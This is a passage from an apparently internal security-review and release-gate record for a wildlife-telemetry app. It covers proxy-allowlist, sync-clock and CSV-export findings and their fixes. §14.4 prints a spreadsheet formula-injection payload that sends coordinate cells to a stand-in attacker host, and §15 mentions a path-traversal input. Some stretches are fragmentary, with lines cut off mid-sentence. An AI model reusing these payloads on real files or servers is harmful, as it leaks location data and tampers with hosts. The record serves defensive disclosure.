### 14.2 L-1 — the refusal that closes K-2 does not fire on a degenerate allowlist

`TrustedProxies.fromEnvironment` (`server/lib/src/security/trusted_proxies.dart:286-290`):

```dart
if (raw.isNotEmpty && lowered != trustedProxiesNone) {
  final allowlist = TrustedProxies.parse(raw);
  if (!allowlist.isEmpty) _assertProxySourceIdentityDeclared(environment);
  return allowlist;
}
```

`parse` throws on a *bad* entry and **skips an empty one** (`:234`,
`if (entry.isEmpty) continue;`). So a value of `,` is non-empty, is not
`none`, parses to zero ranges — and both refusals are skipped: the
`!allowlist.isEmpty` guard declines to ask K-2's question, and the `return`
on the next line is taken *before* the block that would have demanded
`peer-verified` for a reachable deployment. Measured, with `compose run`
(no ports published, so nothing was actually exposed):

```
reachable, TRITRACK_TRUSTED_PROXIES unset      -> EXIT 78, "REFUSING TO START — source identity"
reachable, TRITRACK_TRUSTED_PROXIES="   "      -> EXIT 78, "TRITRACK_TRUSTED_PROXIES is not set."
reachable, TRITRACK_TRUSTED_PROXIES=203.0.113.4 -> EXIT 78, "TRITRACK_PROXY_SOURCE_IDENTITY is not set."
reachable, TRITRACK_TRUSTED_PROXIES=","        -> STARTS.  "TriTrack server listening on http://0.0.0.0:8080"
```

Three controls and one hit, in one run. The whitespace case proves the outer
refusal is alive; the real-allowlist case proves 10.74's refusal is alive; the
comma case is the hole between them.

**What it produces.** An empty allowlist means `X-Forwarded-For` is never read
(`request_identity.dart:180` — `trustedProxies.isEmpty || !contains(peer)` falls
through to the TCP peer), so every caller is keyed on the peer address. This
run's own `verify_source_identity.sh` measured what that address is on this
host: two genuinely distinct off-host callers both arrived as
`remote=192.168.65.1`. That is finding I-1 verbatim — one rate-limit bucket for
every user, ten unauthenticated requests denying sign-in to a whole deployment,
and `auth_audit_log.source_address` naming a gateway — reached by a
configuration the server accepted without comment.

**Why blocking.** §4.4.3's design is stated in its own heading: the
qualification is *"enforced by the server, not by this document,"* and the
argument for a startup refusal over a README line is that prose had already lost
that argument three times. K-2 — last round's blocking finding — is closed by
nothing else. A refusal with an input for which it silently does not fire has
not closed it; it has narrowed it to configurations nobody typed by accident.
And `,` is not exotic: it is what a template renders for an empty list, and what
is left behind when someone clears the values and not the separators.

**Bounds, stated fairly.** It requires an operator to write a malformed value;
no shipped file contains one, and `shipped_defaults_test.dart` correctly asserts
no compose file supplies a default. Under `TRITRACK_ENV=production` the
transport-security refusal fires first and catches it. The exposed window is the
reachable non-production shape — which is exactly the README's LAN walkthrough,
the shape J-2 was about. The fix is two lines: treat a non-empty value that
parses to zero ranges as the malformed value it is, and key the second question
on "an allowlist was declared" rather than on "an allowlist has members."
**Task 10.92.**

### 14.3 L-2 — a file that changes nothing but the revision, and the record can never be restored again

§4.19 clause 3 bounds the sync clock: `revision > UntrustedImportRules.maxRevision`
(4,000,000,000) is refused. Clause 4 gates destructive changes behind consent,
and exempts the columns that move on every honest edit —
`columnsMovedByEveryEdit = {revision, updated_at, last_modified_by}`
(`packages/tritrack_sync/lib/src/untrusted_import.dart:98-102`).

Those two are individually right and jointly a hole. An archive whose rows are
byte-identical to the victim's except for `revision`, set to **exactly** the
ceiling (the check is `>`, so the ceiling itself is legal), produces no visible
change at all:

```
poison: outcome=MergeOutcome.applied updated=1 destructiveChanges=0 changes=0 issues=0
victim row revision is now 4000000000
report the user sees: Inserted 0, Updated 1, Refused 0, Issues 0
```

No dialog — clause 4 has nothing to show. Then the biologist makes one honest
edit on their own device; `base_repository.dart:257` is
`revision = revision + 1`:

```
after one honest edit, revision = 4000000001
```

And their own project export, restored onto a replacement device, refuses that
row:

```
RESTORE ONTO NEW DEVICE: inserted=3 refused=1 rows present=0
  restore issue: Observations[obs-1/project-local].revision:
                 sync clock is out of range (implausibly large: 4000000001)
```

**The observation does not restore, on that device or any other.** The user is
shown a count — `_showMergeReport` renders `Refused …: 1` and never renders
`report.issues` (`data_export_screen.dart:352-360`) — so an irreplaceable field
record is dropped from a disaster recovery with a number and no name.

A second harm needs no edit at all. After poisoning, a teammate's genuine
correction is discarded forever, because the local clock now wins everything:

```
genuine correction (revision 7, later updated_at): updated=0 skipped=1 issues=0
bearing on disk: 145.0 (colleague sent 151.0), notes="clear signal"
```

The row is frozen against every honest correction for the life of the project,
and the app reports it as *"Unchanged (local was newer)."*

**Why blocking.** This is silent loss of irreplaceable field data — the harm
§1 ranks first and the one J-1 and K-1 were each rated blocking for — under the
**default** strategy, with validation on, with **no dialog at all**, delivered
by the exact route §4.19.1 rows 4 and 9 describe. It is worse than K-1 in one
specific respect: K-1's damage was visible in the database immediately, and this
is invisible until the day the user needs the backup. There is no bound on
`revision` on the server either, so a poisoned row propagates to every teammate,
whose exports then fail identically. **Task 10.93.**

The design lesson is narrow and worth stating precisely: **clause 4's exemption
criterion — "this column moves on every honest edit" — is sound for a column
whose value is *ignored*, and unsound for one the merge *reads*.** `revision` is
the merge's ordering key and clause 3's bounded quantity. Exempting it from the
diff means the one field an attacker most wants to set is the one field the user
is never shown.

### 14.4 L-3 — the export is a weapon, and six gates never looked at it

Every CSV encoder calls `Csv().encode(rows)` with the default quoting and no
formula-prefix neutralization anywhere in the repository
(`observation_csv.dart:88`, `tag_csv_export.dart:41`, `non_detection_csv.dart:70`).
Real output from `ObservationCsv.export`, reproduced against the real encoder:

```
observation_id,tag_name,tag_frequency_mhz,observer_name,…,latitude,longitude,…
obs-1,"=WEBSERVICE(""http://poacher.example/?p=""&TEXTJOIN("","",1,H2,I2))",150.123,=1+1 Researcher,…,35.1983,-111.6513,…
lat column index: 7, lon: 8
```

`latitude` is spreadsheet column **H** and `longitude` is **I**. The payload in
B2 reads exactly those two cells and sends them to a host of the author's
choosing the moment a colleague opens the file. `observer_name` went out as
`=1+1 Researcher` with no quoting at all, and the tag roster export wrote a bare
DDE payload into `notes`.

**Why this is reachable from outside the team, which is what makes it a
finding rather than §5.2.** A tag name is attacker-writable without any
membership: §4.19's clauses govern *destruction*, and an insert-only archive
needs no consent, so a hostile `.zip` plants the tag and the app reports
"Inserted: 1." The user later exports for a colleague, a journal, or a
data-management plan, and the coordinates leave from the recipient's machine.
§5.7 does not cover this — it accepts that exported data is unprotected *as
data*; this is the export **executing**.

**Why blocking.** Asset 1, live in the app as shipped, reachable by an outsider,
by the precedent §12.2 set for J-1 and §13.2 applied to K-1: the gate's remit is
asset harm, and a finding live in the shipped app belongs on it. The fix is a
standard prefix escape and is small. **Task 10.94.**

**The class insight, which is the part to keep.** §4.19.1 enumerated every
import path and asked *"can it modify an existing row?"* Tag CSV import answered
"insert only" and was marked **Safe** — correctly, on that axis. But the axis is
incomplete twice over: unbounded *insertion* damages a record as surely as
overwriting (§14.9), and a row that is only ever inserted is still a weapon **on
the way back out**. The enumeration asked what a file can do to the database and
never asked what the database can do to whoever opens the export. **Export was
not on the list.**

### 14.5 What holds, re-verified rather than assumed

**K-1 is closed and I could not reopen it.** Re-reproduced independently
through `BackupArchive.encode` → bytes → `decode` → `ProjectMerger.merge`,
default strategy, validation on, consent default:

```
report: inserted=0 updated=0 skipped=0 invalid=0 refused=4 outcome=applied
Projects.owner_user_id = user-victim  rev=0
obs-1: lat=35.1983 lon=-111.6513  user_id=user-victim  last_modified_by=user-victim
       declination=10.2  wmm=WMM2025  rev=4  device=device-victim-phone
obs-2: deleted_at=null
Users rows now: [user-victim/victim@example.org]
```

Each of §13.2's four measured facts answers to a named clause: `preferIncoming`
is refused too, the manifest's project scope is enforced (a file naming
`project-somewhere-else` cannot touch `project-local`), the email dedup fires
and is counted, and `RowValidator` still runs. Beyond the transcript: `revision`
as a double, a numeric string, negative, boolean or `2^63-1` is each refused
with a named issue; a row carrying neither `revision` nor `updated_at` **loses**
rather than defaulting to winning; `created_at` after `updated_at` is refused; a
declined consent dialog leaves the database byte-identical and creates no table
as a side effect; a confirmed overwrite writes the prior version to
`Sync_Conflicts` **before** the update, every time; and on a confirmed
overwrite `user_id` stays with the victim and `last_modified_by` is restated to
the importer. A hostile `TT1:` payload naming an unknown observer is still
`refusedNotAuthor` outright.

**K-2's refusal is real**, subject to §14.2. **J-3 holds** — the server's role is
still `NOSUPERUSER`. **C-1…C-5, D-1 and I-4 refuse again**, by instruments that
each ran live and each proved able to abort on a forced-stale constant. The
backup/restore drill is green including I-2's renamed-copy step,
`verify_h6_archive_forgery.sh` refuses a forged archive, TLS terminates through
Caddy's internal CA with the origin unreachable directly, and the diagnostics
console still fails closed off-host. Zip path traversal is refused by
construction (`decode` extracts nothing; it reads two fixed entry names).
Outbound network calls carry no coordinate, project name, tag name, email or
token — tile templates carry only `{z}/{x}/{y}/{s}`, and there is no
`url_launcher`, WebView, analytics or crash reporter in the tree. §4.7's logging
rules hold on both sides.

**ATS, second gate running, on hardware.** `verify_ats_transport_security.sh
macos --profile` — a real profile-mode bundle on macOS 26.6 — **2 checks pass**.
It was not re-neutralized this round; §13.8 demonstrated it can fail, and that
demonstration stands.

### 14.6 L-7 — `RowValidator` bounds identifiers and stops at free text, on both sides

Measured against the live server **with a passing control in the same run**,
which is what makes the rest of the line a measurement:

```
CONTROL ordinary tag name -> 200 applied=1 ['inserted']
NUL byte                  -> 200 applied=0 ['invalid']
5 MiB tag_name            -> 200 applied=1 ['inserted']   <<< STORED
newline + CR              -> 200 applied=1 ['inserted']   <<< STORED
bidi override             -> 200 applied=1 ['inserted']   <<< STORED
empty string              -> 200 applied=1 ['inserted']   <<< STORED
```

Task 10.75 bounded identifier columns and `email`. `tag_name`, `notes`,
`pulse_pattern`, `antenna_type`, `project_name`, `first_name` and `last_name`
have no length bound, no non-blank check and no control-character rule, on the
client or the server — and the server is the same `RowValidator`
(`sync_service.dart:154`). A 5 MiB tag name is stored and returned to every
device on the next pull; an empty one is accepted for the column Phase 4 made
the map legend key.

**Not** an untyped `500`: the NUL case is refused cleanly, so J-4's typing work
holds where it was aimed. This is the bound, not the typing. Non-blocking —
storage growth and rendering, not disclosure or loss. **Task 10.97.**

### 14.7 The gate's own instruments, again — and this time the baseline

Three findings, all in tooling this round or the last one shipped.

**L-4 — 10.91's baseline cannot do what its acceptance criterion promised.**
`gate_c_baseline.py:43-46` keys on the leading token of a check name
(`check_name.split(" ", 1)[0]`), and **that token space is already colliding in
the file it indexes**: `Cd` names three distinct checks, `Ea`, `A1` and `A2`
name two each. The four baselined tokens are unique only by accident, today.
A future second `Dc …` check that fails for a genuinely new reason is absorbed:
its token is in the baseline, the entry still has a `failed` kind, so neither
`UNBASELINED FAILURE` nor `BASELINE REGRESSION` nor `BASELINE STALE` fires and
the pass exits 0. Second half: the citation check `_ACCEPTED_RE` is a keyword
search (`non-blocking|not blocking|none blocking|accepted`) over the **whole**
cited section body, and never looks for the entry's own `finding_id` or
`check_id` in it — §8.4 is ~521 lines with six accepted-word hits, so any new
failure can be blessed by citing it. Third: `evaluate()` is never told how many
checks ran, so a check that is commented out or lost in a refactor produces no
complaint. Task 10.91's stated criterion was *"a baseline that cannot hide a
fifth."* It can. **This does not change this run's result** — I read the
adversarial pass's full output and the four failures are the four named ones,
by name, with the other 36 held — but it means the *mechanism* did not
establish that, I did. **Task 10.95.**

**L-13 — `Cf`'s class is live in a file the detector scans, and the detector
cannot see it.** `scripts/backup_restore_drill.sh:764`:

```bash
[ -z "$(ls -A "$TRITRACK_BACKUP_DIR"/*.part 2>/dev/null || true)" ] \
  || fail "a .part file survived a failed run"
```

Reproduced with a control: pointed at a nonexistent directory the check
**passes** — *"I could not look"* reading as *"confirmed clear"* — and pointed at
a directory that really holds a `.part` file it correctly fails.
`verify_instrument_unchecked_returns.py`'s `SWALLOW_ASSIGN` pattern requires an
assignment to a named variable and the whole construct on one physical line, so
it reads neither this nor the majority of the capture-with-swallow sites in the
two directories it scans. Its "0 findings" is honest about its scope and is not
evidence about the class. Alongside it: `throwsA(anything)` survives at
`test/data/sync/project_merger_test.dart:505` — guarding *K-1's own merge path*
— and `test/data/sync/project_joiner_test.dart:65`; `verify_c3_cleartext_defaults.py`
is still not registered in `gate_smoke_test.sh` (K-7, carried, task 10.82); and
K-3's deep-link fix is on Android and iOS but not `macos/Runner/Info.plist`,
which is the one platform where the receiver is still armed by default and
closed only by the absence of a registered URL type. **Task 10.103.**

**One small note in the instruments' favour**, because it was checked rather
than assumed: `GATE_SMOKE_SELFTEST=1` mutates `scripts/gate_wire.py` in place
and restores it from an `EXIT` trap. The restore fired correctly here and the
tree was clean afterwards. The copy it restores from lives in a `mktemp`
directory rather than coming from `git`, so a `SIGKILL` would leave the stale
constant in the tree — worth a line in 10.103, not a finding.

A gate that reports only its hits is not a measurement.

- **A hostile archive does *not* grant the attacker server-side access.** The
  most consequential open question this round was whether a consent-free
  `Project_Memberships` insert escalates. Measured live: an owner pushing a
  membership row naming another user gets
  `applied=0 outcomes={'Project_Memberships/…': 'invalid'}`, and that user's
  `/sync/pull` on the project still answers `403 forbidden` — before **and**
  after. §4.17 holds, and the client-side finding is bounded to the device.
- **A NUL byte in a row's free text is not an untyped `500`** — it is refused as
  `invalid` (§14.6). J-4's enumeration holds on the shape it covered.
- **Tag CSV import cannot claim identity or the merge clock** — a row carrying
  `tag_id`, `revision` and `last_modified_by` still got a fresh UUIDv4 and
  `SyncMeta.initial`. §4.19.1's "Safe" verdict on that axis is correct; §14.4 is
  a different axis.
- **`CloudBackupService` still has no decoder**, and the only `ProjectMerger.merge`
  call sites are the two in `data_export_screen.dart` (default
  `untrustedArchive`) and the one in `sync_engine.dart` (explicit
  `authenticatedServer`). The default origin is the strict one, so a new caller
  fails safe.

  `SyncRowOutcome.fromDb` is `values.firstWhere(…)` with no `orElse`

  `BackupArchive.decode` enforces no decompressed size, row count or ratio

  `backup_format.dart:80-81` says is *"used to cross-check the decoded payload

### 14.12 Residual risk, in plain language

**Two things a TriTrack user can lose today, with no server involved.**

*A project file from someone they don't fully trust can permanently destroy an
observation without appearing to change anything.* The file need not delete or
move anything; it sets one internal counter to its maximum, which no dialog
shows because that counter changes on every honest edit anyway. The record looks
fine — until the phone is lost and the backup is restored on a new device, where
that observation is silently dropped from the restore. In the meantime, no
colleague's correction to it can ever land. This is the most severe item in this
document and it is live for users of the app today.

*A CSV they export can attack whoever opens it.* Spreadsheet software executes
formulas in a file, and TriTrack writes tag names and observer names into that
file exactly as they were stored. A tag name planted by an imported project file
— which needs no confirmation, because adding a tag isn't destructive — can read
the latitude and longitude columns sitting beside it and send them to a stranger
the moment a colleague opens the file. The person harmed is the recipient, and
the data leaked is the one this project ranks first.

**And one the operating system does by default.** On Android and iPhone alike,
nothing in the app opts out of the platform's automatic backup, so the app's
database — every coordinate in it — is copied to the user's cloud account. The
decision not to encrypt the local database was made on the reasoning that the
OS sandbox protects it; this is the sandbox's own documented exit. **As of
task 11.215 (2026-09-10), this is a decision Michael made rather than a gap
nobody noticed:** a phone lost in the field is more likely than a stolen cloud
account, and the records at risk are the same either way — the ones not yet on
the server — so for essentially every project the safety net is worth more
than the exposure. A project working with a species that cannot afford any
leak can turn this backup off for TriTrack alone, in the phone's own settings.

**Sign-in denial is now refused rather than accepted**, which is genuine
progress: the server will not start in a deployment where it cannot tell one
caller from another. The exception is a malformed configuration value that slips
past that refusal (L-1) — the first thing to fix.

Everything else in §13.10 stands: **no protected-species location has ever left
a device except to a user's own cloud backup (§4.15.1's accepted, time-bounded
default) and to a server that listens only on localhost.**

`fa74a85` — the sixth gate's own record — and that revision changed the

> *"It has now failed that assessment five times"* … *"The most recent round
> found two more, and both are in the same category as each other"* — describing
> the rate-limit collapse and the backup-retention rename, which were the
> **fourth** round's findings.

**J-1 and K-1 do not appear in it at all.** Those are the two most severe
findings in this entire record, both silent corruption of the field record, both
live in the shipped app when they were found, and both exactly the kind of thing
an institutional reviewer is being asked to have an opinion about. A letter that
asks *"are the risks I've decided to accept reasonable ones"* while omitting the
top two is not a small staleness; it would have produced a review of the wrong
system.

Revised here — the fifth revision, by the fifth gate that cannot send it. The
substance now names the untrusted-import class as the round's headline, points at
§14.12, states that two of the three questions it previously raised as "mine
rather than yours" are closed, and adds the platform-backup question (L-10),
which is squarely an institutional-practice question.

The rest is unchanged and unchangeable from here: **recipient blank, still not

### 14.14 On the process

Six rounds found their blocking findings on the server, then on the topology
around it, then on the client paths beside it. **This round found none on any of
them.** The server survived 40 adversarial attempts, 12 instruments and a full
review of 78 changed files with one bound missing (L-7) and nothing else. Two of
the three blocking findings are on ground no gate had touched: a *field the
consent gate deliberately ignores*, and the *export* side of a path that had been
enumerated only on its import side.

That is the pattern worth naming after seven rounds. **Each gate's blocking
findings have been in whatever the previous round's remediation defined as
out-of-frame** — and the frame has been drawn, every time, by the enumeration
that closed the last finding. §4.19.1 is an excellent artifact and it asked five
questions about eight paths; L-2 is a sixth question it didn't ask about a path
it did list, and L-3 is the same path in the other direction. The enumeration was
not wrong. It was an enumeration, and the next finding was outside it.

The cheap clause this suggests, in the spirit of §12.11 and §13.12 — both of
which worked — is: **when a control exempts something, the exemption is the
finding, and it gets its own line in the enumeration.** Clause 4 exempts three
columns and says why; nobody asked what an attacker could do with a column the
user is never shown. Clause 3 bounds `revision` and says the bound "defends
nothing on its own"; nobody asked what happens when a legal value inside that
bound makes an *honest* value fall outside it later.

One in the gate's favour, again, and it is the same one for the seventh time:
**reading a detail line rather than a verdict caught it.** L-1 was found by
reading two lines of a `if (!allowlist.isEmpty)` guard against a test, three
hundred lines away in the same package, that names the exact failure mode in
prose. Everything needed to find it was committed, deliberate, and correct in
isolation.

## 15. The register — every finding below the bar (task 10.106, 2026-08-16)

**This section is authoritative for the disposition of every open finding.** It
is the artifact `SECURITY_SCOPE_AND_EXIT.md` §5 requires, and it supersedes
"every finding needs a task" as the operating rule. §14 and earlier remain the
*evidence*; this is the *decision*.

### 15.0 How the bar was read, so the next gate does not re-derive it

§4's bar has four clauses. Three are harms (B1 loss, B2 disclosure, B3 remote
access). The fourth — *"a control the security model asserts exists that does
not exist, or does not fire; includes a check that cannot fail"* — is not a
harm, and read literally it makes every documentation drift blocking. That
reading is the treadmill this document exists to stop, and it is falsified by
the record: **§4.7's unimplemented retention sweep has been named at six
consecutive gates and rated blocking by none of them**, and §4.8's unbuilt
control 2 at four.

**B4 is therefore a route to B1–B3, not an independent bar.** A missing or
vacuous control blocks when what it leaves undefended is one of B1, B2 or B3.
This is how L-1 blocks — the refusal that does not fire leaves the
source-identity collapse (B3's territory) live — and how §4.7's retention gap
does not: what it leaves undefended is audit rows kept past their policy.

Applied here, this reproduces every judgment §14 already made. It also settles
two items the earlier gates argued each round, which is the point.

### 15.2 Prerequisite to a verdict, not a finding

**Task 10.95 is not on §4's bar and blocks both gates anyway**, because §6's
exit criteria name the mechanism it repairs: Gate C criterion 4 requires the
adversarial pass to match its baseline and the instruments to be *self-tested*,
and Gate D criterion 4 requires the default suite green across three
consecutive runs. L-4 (the baseline keys on a colliding token and can absorb a
new failure), L-13 (a drill check that passes when it cannot look), L-16 (the
default suite is red about one run in three) and K-7 (task 10.82) each falsify
one of those clauses.

The distinction matters: **a gate could pass with these open if it verified the
same facts by hand, as §14 did.** They are scheduled because the next verdict
should rest on the instrument rather than on the reviewer.

What remains is unbounded file creation on a non-production host by an anonymous caller — §5.6, on a host that listens on loopback. **Amended 2026-08-30 (task 11.71), and the amendment is about which bound was doing the work.** The sanitiser is load-bearing and that is now measured rather than assumed: with it removed, an unauthenticated address of the form `../../../../tmp/…` makes this server create a caller-named file in `/tmp` — watched happening, not reasoned about. Against a TLS deployment a hijacker cannot complete the handshake for the real hostname, so no redirect is delivered. Recorded because the absence is real and the reasoning should not have to be re-derived. |

1. **§14.5 is wrong about outbound coordinates** — see M-7 in §15.3. §5.8 is

   elevation fetcher was never separately assessed by the claim that covers it.

   what the database can do to whoever opens the export** — §14.4 named this and
   it generalises past CSV. Tag CSV import is genuinely **Hardened** on the
   identity-and-clock axis (§14.8 attacked it live; this triage re-read the
   code and confirms there is no `tag_id`, `revision`, `last_modified_by`,

**L-1 closed.** `TrustedProxies.fromEnvironment`
(`server/lib/src/security/trusted_proxies.dart:280-303`) now treats a
non-empty, non-`none` value that parses to zero ranges as malformed and
throws, rather than falling through to `none`. The K-2 attestation
(`_assertProxySourceIdentityDeclared`) is now asserted unconditionally the
moment an allowlist is declared, not only when `!allowlist.isEmpty` — so a
degenerate allowlist can no longer skip both refusals at once. Measured live
against `bin/server.dart`, same shapes §14.2 measured:

```
reachable, TRITRACK_TRUSTED_PROXIES unset      -> EXIT 78, "is not set"
reachable, TRITRACK_TRUSTED_PROXIES="   "      -> EXIT 78, "is not set"
reachable, TRITRACK_TRUSTED_PROXIES=","        -> EXIT 78, "names zero proxies" (was: STARTS)
reachable, TRITRACK_TRUSTED_PROXIES=203.0.113.4 -> EXIT 78, "TRITRACK_PROXY_SOURCE_IDENTITY is not set"
```

**The empty-means-skip sweep, verdict per site.** L-1's actual shape is a
value that parses successfully into an *empty collection*, with the emptiness
of the parsed result then read as "nothing was declared." Every environment
variable the server reads was checked for the same shape:

| Site | Pattern | Verdict |
| --- | --- | --- |
| `trusted_proxies.dart` — `TRITRACK_TRUSTED_PROXIES` | Splits into a `List<IpRange>`, previously branched on the parsed list's emptiness | **Was vulnerable — fixed above.** The only site in the server that parses a variable into a collection before deciding whether anything was declared. |
| `trusted_proxies.dart` — `TRITRACK_PROXY_SOURCE_IDENTITY` | Trimmed, lower-cased, matched against two literal strings | **Not vulnerable.** Compares the raw string directly; there is no intermediate parse step whose emptiness could be substituted for the raw value's. |
| `security_config.dart` — `TRITRACK_ALLOW_CLEARTEXT_LAN`, `TRITRACK_ENV` | `== '1'`, `== 'production'` | **Not vulnerable.** Exact string equality; a degenerate value is simply not equal to the sentinel, which is the refusing branch. |
| `security_config.dart` — `TRITRACK_TLS_CERT_PATH`, `TRITRACK_TLS_KEY_PATH` | `_nonEmpty` maps blank to `null`, then both must be null or both non-null | **Not vulnerable.** A single blank value produces a "half-configured" refusal (`security_config.dart:174`) rather than silently matching the all-unset case — checked by pairing on `null`, not by parsing into anything with its own emptiness. |
| `rate_limiter.dart` — `TRITRACK_RATE_LIMIT_PER_SOURCE_DISABLED` | `== '1'` | **Not vulnerable.** Same shape as above. |
| `diagnostics_config.dart` — `TRITRACK_DIAGNOSTICS_ENABLED`, `TRITRACK_DIAGNOSTICS_TOKEN` | `== 'true'`; token checked `null || isEmpty` and refused if so | **Not vulnerable.** The emptiness check here is the refusal itself (a blank token is rejected), not a fallback to "nothing was configured." |
| `email_sender.dart` — `TRITRACK_DEV_MAGIC_LINK_DIR`, `TRITRACK_ENV` | `!= null && isNotEmpty` gates a refusal | **Not vulnerable.** Same shape — emptiness routes to the refusal branch, not around it. |
| `postgres_database.dart` — `POSTGRES_*` | `value == null || value.isEmpty` throws `StateError` | **Not vulnerable.** Emptiness is the failure condition, checked directly on the raw string. |
| `trusted_proxies.dart` — `TRITRACK_PUBLISH_ADDRESS` (`DeploymentReach.of`) | Trimmed; empty falls through to a TLS/cleartext-derived fallback, not to "loopback" | **Not vulnerable.** Empty is handled as its own branch (`raw.isNotEmpty` gate) with an explicit fallback policy, not conflated with a parsed collection's emptiness. |

No second site shares L-1's shape. The class is now covered by
`trusted_proxies_test.dart`'s `'a declared allowlist that names nobody is
malformed (L-1)'` group, which also asserts the refusal fires with no
`TRITRACK_PROXY_SOURCE_IDENTITY` set at all (proving it is not merely caught
by the *next* check) and that a real entry alongside blank ones is
unaffected.

**10.83 closed alongside it.** `ensureServerAppRole`
(`server/lib/src/db/postgres_database.dart`) now revokes `DELETE, TRUNCATE`
on `auth_audit_log` and `sync_traffic_log` from `tritrack_app` on every start,
narrower than the `GRANT ... ON ALL TABLES` it follows. Verified live against
real Postgres (`server_app_role_test.dart`, task 10.83's group): the demoted
role's `DELETE`/`TRUNCATE` on both tables now fail `42501`
(`insufficient_privilege`), and ordinary `INSERT`/`SELECT` traffic is
unaffected. §4.7 above records the same closure and the deferred state of the
retention purge (10.81) it is the sibling of.

Three things were needed to make this hold, not one, each caught by running
the *full* suite rather than this file alone — the same lesson §14.7 already
recorded about the gate's instruments:

1. **The grant and the revoke must be one transaction.** Committed
   separately, every other connection that also calls `ensureServerAppRole`
   (a dozen-plus test files do, concurrently) can observe the moment after
   the broad grant and before the narrowing revoke, during which `DELETE` is
   genuinely available.
2. **The revoke must be schema-qualified.** `REVOKE ... ON auth_audit_log`
   (unqualified) resolves against `search_path`, and most of this suite's
   Postgres-backed test files put a per-test schema ahead of `public`. An
   unqualified revoke from such a connection narrows *that* schema's table
   and leaves `public.auth_audit_log` — the one production actually uses —
   re-widened by the grant on every such call. This was the reproducible
   failure, not the transaction ordering in (1); `public.auth_audit_log`
   still had `DELETE` after a full suite run until this was fixed.
3. **The retry class needed widening, not just the two statements above.**
   `_retryOnConcurrentCatalogUpdate` (task 10.89) only matched "tuple
   concurrently updated"; heavy concurrent DDL against the same catalog rows
   also throws "tuple concurrently deleted" and "cache lookup failed for
   relation" for the identical reason. Widened to match all three, attempts
   raised 5→20. `server_app_role_test.dart`'s own probe-table
   `DROP`/`CREATE TABLE` churn (task 10.63, pre-existing, not previously
   retried at all) turned out to be the largest remaining source of
   suite-only flakiness once (1) and (2) were fixed — now wrapped in the same
   retry. Seven consecutive full-suite runs green after all three landed.

**Not closed here, and not in scope of this task:** the NAU
information-security review (§14.13, §15.1) — an institutional action, not a
code change. Gate C's remaining blocker after this task is that review
happening.

### 15.10 Gate D blockers closed (tasks 10.93 and 10.94, 2026-08-17)

**L-2 closed, and it took two bounds rather than one** — the finding has two
independent harms and closing either alone leaves the other live.

*The ceiling arm.* `UntrustedImportRules.maxImportedRevision` (= `maxRevision -
revisionHeadroom`, 3,999,000,000) is the largest `revision` an untrusted payload
may **carry**, as against the largest this device will **hold**. §14.3's archive
set it to exactly `maxRevision`, which was legal because clause 3's check was
`>`; the row applied silently, `base_repository`'s `revision = revision + 1` put
it past the ceiling on the next honest edit, and the holder's own export then
refused it on every device. The row is now refused **at import, by name**, with
the file still on disk and the user told. Enforced on both untrusted paths —
`checkClock` for archives, `ObservationShare.decode` for `TT1:` payloads, which
had the identical hole.

The relaxation that does *not* work, recorded so it is not proposed again:
loosening the bound on restore. An archive is unauthenticated (§4.19.2's named
residual, 10.86), so the restore path cannot tell the user's own export from a
forgery.

*The freeze arm.* A legal-but-large clock outranks a genuine `revision: 7`
forever, and every later correction from a teammate is reported as *"Unchanged
(local was newer)."* The merge clock is therefore no longer exempt from clause
4's diff — see §4.19.3, which re-derives the exemption from the corrected
criterion and enumerates the other eight. It is not diffed column by column
either, because that is the always-alarming prompt the exemption existed to
prevent: `isUnexplainedRevisionAdvance` shows the clock when the payload cannot
account for it (the file changes nothing else, or the advance exceeds
`maxUnexplainedRevisionAdvance`) and stays silent when it can. **The noise
property survives, and there is a test that says so** — an ordinary correction
renders one line, `notes`.

*And the visibility half.* `_showMergeReport` rendered `Refused …: 1` and never
rendered `report.issues`. It is now `ImportReportContent`, which lists every
refusal by table, row and reason — a count the user cannot trace back to a
record is exactly the quiet task 10.28's rule forbids.

**L-12 closed as a class.** `isDestructiveChange` derives from
`SyncTable.deactivationColumns` rather than naming `deleted_at`;
`Project_Memberships` declares `end_date` beside it. The sweep for a third is a
test that greps the repository layer for `<column> IS NULL` visibility filters
and fails on any it finds undeclared — with the detector itself checked against
`ProjectMembershipRepository`'s own clause, because four instruments that could
not fail have already been rejected by this gate.

**L-6 closed at the defect, not the count.** `_applyUserRemap` rewrote the
caller's `ProjectBackup` in place, so the screen's second (consenting) `merge()`
saw ids that were already local, computed an empty remap, and reported
`usersDeduped`/`rowsReattributed` as **0** on precisely the hostile import
§4.19.2 says they are owed for. It is now `_remappedRows`, which returns rows;
untouched rows are shared rather than copied. *A plan pass that mutates its own
input is the defect* — a plan is a description, and describing something twice
must give the same answer.

**L-3 closed, and measured in a spreadsheet rather than in the escaping code.**
Every encoder now goes through `SpreadsheetSafeCsv.encode`. Measured live in
Microsoft Excel on macOS 26.6, with a payload that reads the coordinate cells
beside it (`=H2&"|"&I2`) rather than one that sends them anywhere:

```
BEFORE  B2 has formula: true    B2 value: 35.1983|-111.6513   <<< the tag name read H2 and I2
AFTER   B2 has formula: false   B2 value: '=H2&"|"&I2         <<< inert text
AFTER   H2: 35.1983  I2: -111.6513                            <<< still numbers
```

Two things that fix could have got wrong and did not. **It is a choke point, not
three call sites** — a grep test fails if any file under `lib/` calls
`Csv().encode` directly, because the encoder that matters is the one nobody has
written yet. And **numbers are exempt from the escape**: the standard prefix
would apostrophe every longitude in the western hemisphere, which would break
the export for the science it exists for. A `num` came from a `REAL` column this
app wrote and cannot carry a formula; the untrusted text is in the strings.

The class insight is written down as **§4.19.4**, which asks the outbound
question of all seven formats this app writes and records the verdict for each,
including the four that need nothing.

**L-15 and M-2 closed alongside them.** An invalid `color_hex` now produces a
`TagImportRow.warning` — kept separate from `issues`, because an issue drops the
row and dropping a tag over a color would turn a cosmetic problem into the loss
the fallback exists to prevent — rendered in the preview and counted in the
receipt. The tag CSV commit loop moved out of the widget into `TagCsvCommit`,
one transaction, with the all-or-nothing property tested against a mid-loop
rejection rather than asserted.

**Every fix was neutralised in turn** (the 10.61/10.73 standard): all eight
turned the tests red, and each turned a *different* set red, so no clause is
guarded only by tests another clause also satisfies. Full app suite green
(947 passed / 9 skipped) and the `tritrack_sync` package suite green
(179 passed).

**Gate D's blocking set is now empty.** What remains before a verdict is §6's
criterion 4 — the default suite green across three consecutive runs — and
criterion 1, a failed live attack on record for every client inventory entry.

attacked the §3 inventory rather than free-ranging, and it reached a verdict.
Two verdicts, because §2 splits the question.

### 16.0 Gate results

> ### Gate D — may the app ship to a beta team? **PASSES.**

> surface meets §4's bar; every below-bar finding is registered; and the default
> suite ran green **four** consecutive times, one more than criterion 4 asks.

